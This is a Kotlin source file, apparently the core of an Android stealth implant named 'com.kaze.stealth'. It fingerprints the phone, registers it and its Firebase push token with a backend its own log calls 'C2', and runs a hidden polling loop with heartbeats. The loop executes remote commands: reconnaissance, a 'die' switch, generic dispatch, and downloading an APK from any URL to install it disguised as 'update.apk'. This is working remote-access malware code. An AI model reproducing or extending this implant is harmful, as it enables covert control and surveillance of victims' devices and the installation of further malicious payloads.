package com.kaze.stealth

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.util.Log
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.net.URL
import java.util.concurrent.Executors

object Core {
    private const val TAG = "STEALTH"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var deviceId: String = ""
    private var running = false
    private val executedCommandIds = mutableSetOf<String>()

    fun start(context: Context) {
        if (running) return
        running = true
        scope.launch {
            try {
                val fingerprint = getFingerprint()
                deviceId = fingerprint.replace("|", "_")
                Log.d(TAG, "Device ID: $deviceId")

                Transport.registerDevice(deviceId, fingerprint)
                Log.d(TAG, "Device registered")

                val fcmExecutor = Executors.newSingleThreadExecutor()
                FirebaseMessaging.getInstance().token.addOnCompleteListener(fcmExecutor) { task ->
                    try {
                        if (task.isSuccessful) {
                            val token = task.result
                            if (token != null) {
                                Log.d(TAG, "FCM token obtained: ${token.take(20)}...")
                                Transport.saveFcmToken(deviceId, token)
                                Log.d(TAG, "FCM token saved to Supabase")
                            } else {
                                Log.e(TAG, "FCM token is null")
                            }
                        } else {
                            Log.e(TAG, "FCM token fetch failed: ${task.exception?.message}")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "FCM token save error: ${e.message}")
                    }
                }

                var lastPoll = 0L
                var lastHeartbeat = 0L

                while (running) {
                    val now = System.currentTimeMillis()

                    if (now - lastPoll >= Config.POLL_INTERVAL_MS) {
                        lastPoll = now
                        pollAndExecute(context)
                    }

                    if (now - lastHeartbeat >= Config.HEARTBEAT_INTERVAL_MS) {
                        lastHeartbeat = now
                        try {
                            Transport.updateHeartbeat(deviceId)
                        } catch (_: Exception) {}
                    }

                    delay(10000L)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Core error: ${e.message}")
                running = false
            }
        }
    }

    fun ensureRunning(context: Context) {
        if (!running) {
            start(context)
        }
    }

    fun wakeUp(context: Context) {
        if (!running) {
            start(context)
        }
        scope.launch {
            try {
                pollAndExecute(context)
            } catch (e: Exception) {
                Log.e(TAG, "WakeUp poll error: ${e.message}")
            }
        }
    }

    private fun pollAndExecute(context: Context) {
        try {
            val commands = Transport.pollCommands(deviceId)
            if (commands.isNotEmpty()) {
                for ((cmdId, cmd) in commands) {
                    if (executedCommandIds.contains(cmdId)) continue
                    executedCommandIds.add(cmdId)

                    Log.d(TAG, "Executing: $cmd")
                    Transport.markCommandRunning(cmdId)

                    val result = if (cmd == "recon") {
                        Recon.execute(context)
                    } else if (cmd.startsWith("download|")) {
                        downloadAndInstall(context, cmd.removePrefix("download|"))
                    } else if (cmd == "die") {
                        running = false
                        "BYE"
                    } else {
                        Commands.dispatch(context, cmd)
                    }

                    Transport.sendResult(cmdId, deviceId, result)
                    Transport.markCommandCompleted(cmdId)
                    Log.d(TAG, "Result sent: ${cmd.take(20)} (${result.length} bytes)")
                }
            }
            if (executedCommandIds.size > 500) {
                executedCommandIds.clear()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Poll error: ${e.message}")
        }
    }

    fun stop() {
        running = false
    }

    fun saveFcmTokenToC2(context: Context, token: String) {
        try {
            if (deviceId.isEmpty()) {
                deviceId = getFingerprint().replace("|", "_")
            }
            Transport.saveFcmToken(deviceId, token)
            Log.d(TAG, "FCM token saved to C2 (rotation)")
        } catch (e: Exception) {
            Log.e(TAG, "FCM token save error: ${e.message}")
        }
    }

    private fun getFingerprint(): String {
        return "${Build.MANUFACTURER}|${Build.MODEL}|${Build.DEVICE}|" +
            "${Build.VERSION.RELEASE}|${Build.VERSION.SDK_INT}|" +
            "${Build.BOARD}|${Build.HARDWARE}"
    }

    private fun downloadAndInstall(context: Context, url: String): String {
        return try {
            val apkFile = File(context.cacheDir, "update.apk")
            URL(url).openStream().use { input ->
                apkFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }
            val uri = androidx.core.content.FileProvider.getUriForFile(
                context,
                "${context.packageName}.fileprovider",
                apkFile
            )
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            context.startActivity(intent)
            "DOWNLOADING:$url"
        } catch (e: Exception) {
            "ERROR:${e.message}"
        }
    }
}
